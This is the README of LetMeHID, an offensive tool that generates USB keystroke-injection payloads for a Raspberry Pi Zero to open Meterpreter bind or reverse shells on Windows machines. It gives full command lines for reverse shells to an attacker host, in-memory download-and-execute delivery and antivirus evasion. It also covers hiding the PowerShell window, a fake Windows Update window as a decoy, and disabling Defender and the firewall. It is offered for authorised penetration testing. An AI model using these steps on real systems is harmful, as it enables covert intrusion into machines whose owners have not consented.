# LetMeHID

LetMeHID is a tool that generates Windows HID payloads to obtain bind or reverse access using Raspberry PI0 and P4wnP1 A.L.O.A.

It implements various techniques to deliver and execute the payload (direct on keyboard, download and execute, using PI0 external device), it has a low detection rate from Antivirus softwares (avoiding uploading to VirusTotal could help keep it in that way...) and it is highly configurable.

**Bonus: This tool could be useful also if you are not interested in HID devices. During a penetration test if you have a command execution or a shell access, you can copy and paste commands generated by LetMeHID to easy obtain a bind/reverse Meterpreter shell :)**

## Author

- Federico Dotta, Security Advisor at @Mediaservice.net

## Related projects

LetMeHID is based on the following projects:
- [P4wnP1 A.L.O.A. by MaMe82](https://github.com/RoganDawes/P4wnP1_aloa), a framework which turns a Rapsberry Pi Zero W into a flexible, low-cost platform for pentesting, red teaming and physical engagements ... or into "A Little Offensive Appliance".
- [letmein.ps1 by raptor](https://github.com/0xdea/tactical-exploitation/blob/master/letmein.ps1), a PowerShell Stager for Metasploit Framework
- [Metasploit Framework by rapid7](https://github.com/rapid7/metasploit-framework), that everybody knows (or you are in the wrong place...)

## How does it work

LetMeHID generates Windows payloads ready to be executed with P4wnP1 A.L.O.A. Generated payloads can be executed on target Windows system in order to try to obtain a bind or reverse access using Metasploit Meterpreter.

The Meterpreter Stager that is executed by LetMeHID is raptor letmein.ps1, a pure PowerShell Stager that is perfect for the purpose. The stager on his own has a very low detection rate but has been further compressed and modified in order to be as stealth as possible. Furthermore, with "direct" and "downloadAndExecute" modes (explained later) the stager is never stored on the filesystem (it is downloaded and processed only in memory) and consequently can be detected only by security tools that inspect the memory at runtime.

If you want to achieve an event greater degree of Antivirus elusion, you can sobstitute the bind and reverse stagers (that are stored outsite LetMeHID script) with custom ones (pay attention to the payload length because there are limitations on command length in powershell). You can also obfuscate meterpreter metsrv.dll, because many software that ispect the memory (like CrowdStrike) block meterpreter when the DLL is received from stager.

## Modes of operation

LetMeHID generates the following types of payloads:

- direct: the payload is typed directly by the keyboard (longer but does not requires anything to work)
- downloadAndExecute: the payload is downloaded from the attacker machine (proxy and proxy credentials supported) directly into the memory (without downloading to the filesystem) and executed from memory (faster but require a connection from target)
- executeFromSd: the payload is executed from the external memory or external CD rom emulated from the Raspberry PI0 (faster but adds an external memory or external CD rom to target, that can be suspicious/detected...)

## Starting modes

One of the crucial points of HID payloads is when the payloads should start (see [README of P4wnP1 A.L.O.A. for further detauls](https://github.com/mame82/P4wnP1_aloa)):

- now: the payloads starts immediately (good for debugging purposes but not for real life situations: the execution of the payload will probably start before the fake keyboard is properly installed by target operating system)
- waitLED: the payload starts when the keyboard is installed by the operating system
- waitLEDRepeat: the payload starts after pressing multiple time NUM LOCK, SCROLL LOCK or CAPS LOCK (useful when you want to manually start the payload)
- delay: fixed delay before starting (should be tuned to avoid the start of the payload before the fake keyboard is properly installed by target operating system)

## Addictional features

Some juicy features has been added to LetMeHID in order to increase the success of the attack or to fake a real process:

- Payloads support also PowerShell 2.0
- Payloads use "-windowstyle hidden" option of PowerShell that put the PowerShell window in background 
- "fakeLegitProcess" option executes a custom command after the payload, in order to simulate a legit process like and AntiVirus update that spawns terminals. With this option, the default command opens the Windows Update page of the Control Panel (but can be changed)
- Admin mode tries to open a PowerShell terminal with administrative privileges (there is a delay of 5 seconds because the UAT popup can require more time to show up)
- "disableDefender" and "disableFirewall" options try to disable Windows Defender and Windows Firewall (admin mode only)

## Examples

### Download and execute (best option if the HTTP/HTTPS connections from victim to us are not blocked)

**Full command:**  

	python LetMeHID.py --layout it --attack downloadAndExecute --start waitLED --httpServerAddress 192.168.1.254 --httpServerPort 8485 --type reverse --port 8484 --ipRevListener 192.168.1.254 --generatePayload --fakeLegitProcess

**Details:**  

	python LetMeHID.py --layout it --attack downloadAndExecute  ->  *Italian keyboard layout, downloadAndExecute attack*  
	--start waitLED  ->  *Start when the keyboard is installed by the system*  
	--httpServerAddress 192.168.1.254 --httpServerPort 8485  ->  *The payload will be served at 192.168.1.254:8485, default path /enc_pay.txt, default protocol HTTP*  
	--type reverse --port 8484 --ipRevListener 192.168.1.254  ->  *Reverse shell payload, Meterpreter listener at 192.168.1.254:8484*  
	--generatePayload  ->  *Generate payload that must be copied in the server web to ./enc_pay.txt*  
	--fakeLegitProcess  ->  *Simulate a legit process by executing a program after the payload. Default program Windows Update page of the Control Panel*  

**Pre-requisites:**  

	\# Set up a web server  
	mkdir /tmp/webserver/  
	cp ./enc_pay.txt /tmp/webserver/  
	cd /tmp/webserver/  
	python2 -m SimpleHTTPServer 8485  

#### Direct execution (this attack does not require anything but print a lot of thing on powershell and consequently is more detectable)

**Full command:** 

	python LetMeHID.py --layout it --attack direct --start waitLED --type bind --port 5555 --admin --disableDefender  

**Details:**  

	python LetMeHID.py --layout it --attack direct  ->  *Italian keyboard layout, direct attack*  
	--start waitLEDRepeat  ->  *the payload starts after pressing multiple time NUM LOCK, SCROLL LOCK or CAPS LOCK*  
	--type bind --port 5555  ->  *Bind shell payload, Meterpreter listener at local port 5555*  
	--admin --disableDefender  ->  *Try to run powershell as Administrator* and then to disable Defender before running meterpreter payload*  

### Execute from PI0 internal SD card or CD Rom drive

**Full command:**  

	python LetMeHID.py --layout it --start fixedTime --fixedTime 60000 --attack executeFromSd --driveName Keyboard --type reverse --port 8484 --ipRevListener 192.168.1.254 --generatePayload --fakeLegitProcess  

**Details:**  

	python LetMeHID.py --layout it --attack executeFromSd ->  *Italian keyboard layout, executeFromSd attack*  
	--start fixedTime --fixedTime 60000  ->  *Run payload after 60 seconds*  
	--driveName Keyboard  ->  *The payload is retrieved from external drive/CD-rom named Keyboard, supplied from PI0, default file name enc_pay.txt*  
	--type reverse --port 8484 --ipRevListener 192.168.1.254  ->  *Reverse shell payload, Meterpreter listener at 192.168.1.254:8484*  
	--generatePayload  ->  *Generate payload that must be copied in the server web to ./enc_pay.txt*  
	--fakeLegitProcess  ->  *Simulate a legit process by executing a program after the payload. Default program Windows Update page of the Control Panel*  

**Pre-requisites for an external drive:**  

	\# It is necessary to generate the image for the external storage that will be created by the PI0. P4wnP1 offers a tool named genimg for the task  
	scp enc_pay.txt root@172.24.0.1:/tmp/  
	ssh root@172.24.0.1  
	mkdir /tmp/sdcard/  
	mv /tmp/enc_pay.txt /tmp/sdcard/  
	cd /tmp/sdcard/  
	/usr/local/P4wnP1/helper/genimg -l Keyboard -s 32 -i /tmp/sdcard/ -o sd_met  
	\# Now go the P4wnP1 A.L.O.A. web page, USB Settings, enable "Mass Storage", click on the option arrow and select "sd_met" in "Image file to use", Confirm and Deploy  

**Pre-requisites for a CD-ROM drive:**  

	\# It is necessary to generate the image for the external storage that will be created by the PI0. P4wnP1 offers a tool named genimg for the task  
	scp enc_pay.txt root@172.24.0.1:/tmp/  
	ssh root@172.24.0.1  
	mkdir /tmp/cdrom/  
	mv /tmp/enc_pay.txt /tmp/cdrom/  
	cd /tmp/cdrom/  
	/usr/local/P4wnP1/helper/genimg -c -l "Keyboard" -i /tmp/cdrom/ -o cd_met  
	\# Now go the P4wnP1 A.L.O.A. web page, USB Settings, enable "Mass Storage", click on the option arrow, enable "CD-Rom" and select "cd_met" in "Image file to use", Confirm and Deploy  

## Detailed options

	usage: LetMeHID.py [-h] --layout LAYOUT
	                   [--attack {direct,downloadAndExecute,executeFromSd}]
	                   [--delay DELAY] [--start {now,waitLED,waitLEDRepeat,fixedTime}]
	                   [--fixedTime FIXEDTIME] [--output {console,output_file}]
	                   [--outputFile OUTPUTFILE] [--fakeLegitProcess]
	                   [--fakeLegitProcessCommand FAKELEGITPROCESSCOMMAND] [--admin]
	                   [--disableDefender] [--disableFirewall] [--type {bind,reverse}]
	                   [--port PORT] [--ipRevListener IPREVLISTENER]
	                   [--generatePayload] [--httpServerProtocol HTTPSERVERPROTOCOL]
	                   [--httpServerAddress HTTPSERVERADDRESS]
	                   [--httpServerPort HTTPSERVERPORT]
	                   [--httpServerPath HTTPSERVERPATH] [--useSystemProxyForDownload]
	                   [--driveName DRIVENAME] [--fileName FILENAME]
	
	A little tool to generate Meterpreter HID attack vectors for P4wnP1 A.L.O.A.
	
	optional arguments:
	  -h, --help            show this help message and exit
	
	required arguments:
	  --layout LAYOUT       Target keyboard layout (default: None)
	
	general arguments:
	  --attack {direct,downloadAndExecute,executeFromSd}
	                        Type directly, download payload or execute from a external
	                        drive/CD rom supplied by the PI0 (default: direct)
	  --delay DELAY         Fixed time in millisecondsbetween instructions (default:
	                        500)
	  --start {now,waitLED,waitLEDRepeat,fixedTime}
	                        When the payload should start (default: waitLED)
	  --fixedTime FIXEDTIME
	                        Fixed time (milliseconds) before starting the payload
	                        (--start fixedTime only) (default: 10000)
	  --output {console,output_file}
	                        Output channel for the HID payload (default: console)
	  --outputFile OUTPUTFILE
	                        Path of the HID payload in output (default:
	                        generatedHIDpayload.txt)
	  --fakeLegitProcess    Run a command in order to fake a legit process (for example
	                        a command that open an update window) (default: False)
	  --fakeLegitProcessCommand FAKELEGITPROCESSCOMMAND
	                        Command to execute in order to fake a legit process
	                        (default Windows Update page of Control Panel) (default:
	                        control.exe /name Microsoft.WindowsUpdate)
	
	admin arguments:
	  --admin               Admin mode (slower) (default: False)
	  --disableDefender     Try to disable defender (admin mode only) (default: False)
	  --disableFirewall     Try to disable firewall (admin mode only) (default: False)
	
	meterpreter arguments:
	  --type {bind,reverse}
	                        Type of meterpreter shell (default: bind)
	  --port PORT           Port of the bind/reverse shell (default: 4444)
	  --ipRevListener IPREVLISTENER
	                        IP address of the reverse listener (reverse only) (default:
	                        None)
	
	downloadAndExecute attack arguments:
	  --generatePayload     Generate payload in file ./enc_pay.txt (default: False)
	  --httpServerProtocol HTTPSERVERPROTOCOL
	                        IP address of the HTTP server serving the meterpreter
	                        payload (downloadAndExecute attack only) (default: http)
	  --httpServerAddress HTTPSERVERADDRESS
	                        IP address of the HTTP server serving the meterpreter
	                        payload (downloadAndExecute attack only) (default: None)
	  --httpServerPort HTTPSERVERPORT
	                        Port of the HTTP server serving the meterpreter payload
	                        (downloadAndExecute attack only) (default: None)
	  --httpServerPath HTTPSERVERPATH
	                        HTTP path of the file (downloadAndExecute attack only)
	                        (default: /enc_pay.txt)
	  --useSystemProxyForDownload
	                        Use system proxy for download (default: False)
	
	executeFromSd attack arguments:
	  --driveName DRIVENAME
	                        Drive name of PI0 (default: None)
	  --fileName FILENAME   Filename of payload (default: enc_pay.txt)
	

# Disclaimer

This software has been created purely for the authorized penetration testing and red teaming activies, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

# MIT License
Copyright (c) 2020 LetMeHID  

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.